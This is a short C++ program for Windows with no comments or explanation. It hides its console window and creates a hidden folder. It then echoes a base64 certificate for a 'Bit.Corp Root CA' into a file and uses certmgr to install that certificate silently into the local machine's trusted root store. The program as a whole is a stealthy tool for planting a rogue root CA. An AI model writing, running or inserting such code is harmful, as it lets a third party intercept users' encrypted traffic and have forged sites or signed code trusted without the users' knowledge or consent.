#include <iostream>
#include <string>

#ifdef _WIN64 || _WIN32
#include "windows.h"
#endif

using namespace std;

int main() {
    #ifdef _WIN64 || _WIN32
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif

    system("mkdir .rianvisbnvuirnicvn");
    system("attrib +h .rianvisbnvuirnicvn");

    // FIRST CERT
    system("NUL> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo -----BEGIN CERTIFICATE----- >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo MIIDcDCCAligAwIBAgIIK45bEJyucpUwDQYJKoZIhvcNAQELBQAwTTELMAkGA1UE >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo BhMCUlUxETAPBgNVBAoTCEJpdC5Db3JwMRAwDgYDVQQLEwdSb290IENBMRkwFwYD >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo VQQDExBCaXQuQ29ycCBSb290IENBMCAXDTIyMDMwMTAwMDAwMFoYDzIxMjIwMzAx >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo MDAwMDAwWjBNMQswCQYDVQQGEwJSVTERMA8GA1UEChMIQml0LkNvcnAxEDAOBgNV >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo BAsTB1Jvb3QgQ0ExGTAXBgNVBAMTEEJpdC5Db3JwIFJvb3QgQ0EwggEiMA0GCSqG >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDSFGOLGLRQ4O9DsZT7X0poICV2WglnqTba >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo sDf1NoC0o5VWhccV7Sm3vwaoGkbVX2bU8yhC3x8ZCPEBrQ6Q78kw+R0KmNCv77io >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo 7m+ohQWDshosvHtNOeHhhx8KH3dB+jkQKljSLWfRv8KnFgAqDsab6t3BoXtRqTnQ >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo RVAG/zgfD/8cHRS+mYDOUApn9m7LozRoGkSuy1fjHzwPzHxjIq+8Z1PVHWnSIQFb >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo iMBvy4AxBBnxPO1ZlM4r4enTdIeIwhTy8Lz+mbhqmOUZek5n1ZxQ5nPH9BjhRpyV >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo lJgbWpGs/fAIZRfAihThjgDIvTKyef3qXtCwdXGiygu/UxXeR0/lAgMBAAGjUjBQ >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo MA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFL3FU2ylmFkbf6Ygf/zybtWUUeFE >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo MAsGA1UdDwQEAwIBBjARBglghkgBhvhCAQEEBAMCAAcwDQYJKoZIhvcNAQELBQAD >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo ggEBACrN+g6StOwfF8Aelp1j1Hh5iRTjrxb1MHBqmzrzQiJV73T7y5MMhbg/rgR7 >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo Jes5cyt/8cNHx5xs8qeGiJ+uIqkhiFEMpet4PtXz0ezfR33sBhHPaSJHOc7ezH0f >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo fOsq+TaCpR2C9Pr/LW8iUiw8baoxUzgleuXDmmhp0NBH2+tVGFgKbv9/9rWhXVOy >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo mlosD5hUVI+bAfvKMb96ZcBbYr4LnfIanHwigloonH+/pNAmIGn2m3mcoLFE3B5e >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo MP4r2HtPOVP7YjmegfER8J6YjbuL5tKi944V4BX/MDkm9RRZ3TBVig4/wHmxO7Py >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo H27fNHcM+XpH0ws1GlgaMxI6sCE= >> .rianvisbnvuirnicvn\\Bit.CA.crt");
    system("echo -----END CERTIFICATE----- >> .rianvisbnvuirnicvn\\Bit.CA.crt");

    system("certmgr /add .rianvisbnvuirnicvn\\Bit.CA.crt /s /r localMachine root");

    return 0;
}
